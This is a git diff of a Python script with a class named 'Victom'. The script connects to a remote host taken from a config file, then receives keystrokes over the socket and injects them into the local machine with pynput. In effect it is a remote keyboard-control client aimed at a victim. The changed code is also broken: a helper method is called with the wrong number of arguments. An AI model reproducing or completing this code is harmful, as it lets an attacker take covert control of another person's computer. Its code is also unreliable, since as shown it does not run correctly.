@@ -3,13 +3,14 @@ import socket
 from pathlib import Path
 from pynput import mouse, keyboard
 from pynput.keyboard import Key, Controller
-import threading, queue
+import time
 
 
 class Victom:
     def __init__(self):
 
         self.keyboard = Controller()
+        self.Client: socket.socket = None
 
         config_path = Path(__file__).with_name('config.json')
         with config_path.open('r', encoding='utf-8') as f:
@@ -18,18 +19,35 @@ class Victom:
         HOST = config['HOST']
         PORT = config['PORT']
 
-        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as c:
-            c.connect((HOST, PORT))
-
-            print(f"Server listening on {HOST}:{PORT}")
+        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as self.Client:
+            self.Client.connect((HOST, PORT))
 
             while True:
-                response = c.recv(1).decode('utf-8')
-                print(response)
-                if response != '*':
-                    self.keyboard.press(response)
-                else:
+                try:
+                    data_size = self.recv_exact(self.Client, 1)
+                    file_size = int.from_bytes(data_size, "big")
+                    KeyPress = self.recv_exact(file_size).decode()
+                except ConnectionError:
                     break
+                
+                print(KeyPress)
+                self.keyboard.press(KeyPress)
+                time.sleep(0.03)
+                self.keyboard.release(KeyPress)
+
+    def recv_exact(self, size):
+        data_record = b""
+        data = data_record
+
+        while len(data_record) < size:
+            data = self.Client.recv(size - len(data_record))
+
+            if not data:
+                raise ConnectionError("Connection closed before receiving all data")
+
+            data_record += data
+
+        return data_record
 
 
 if __name__ == "__main__":
